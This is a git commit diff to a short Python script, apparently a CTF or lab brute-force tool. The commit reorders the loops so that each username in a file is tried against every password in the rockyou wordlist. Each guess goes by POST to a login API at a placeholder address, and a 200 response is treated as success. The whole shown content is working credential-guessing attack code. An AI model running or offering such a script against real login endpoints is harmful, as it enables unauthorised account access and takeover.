a1c0986ba4ac55da536af94f24c76cd9c898c479
alienum <67610662+AL1ENUM@users.noreply.github.com>
2020-12-27 21:03:26 +0200

    Update api-bf.py

--- api-bf.py
+++ api-bf.py
@@ -2,10 +2,10 @@ import requests
 import sys
 #Made by Alienum
 url = 'http://x.x.x.x/api/login'
-with open('/usr/share/wordlists/rockyou.txt') as file:
-  for line in file:
-    with open('user.txt') as users:
-       for u in users:
+with open('user.txt') as users:
+  for u in users:
+    with open('/usr/share/wordlists/rockyou.txt') as file:
+      for line in file:
           user = {"username":u.strip(),"password":line.strip()}
           r =  requests.post(url,data = user)
           if r.status_code == 200:
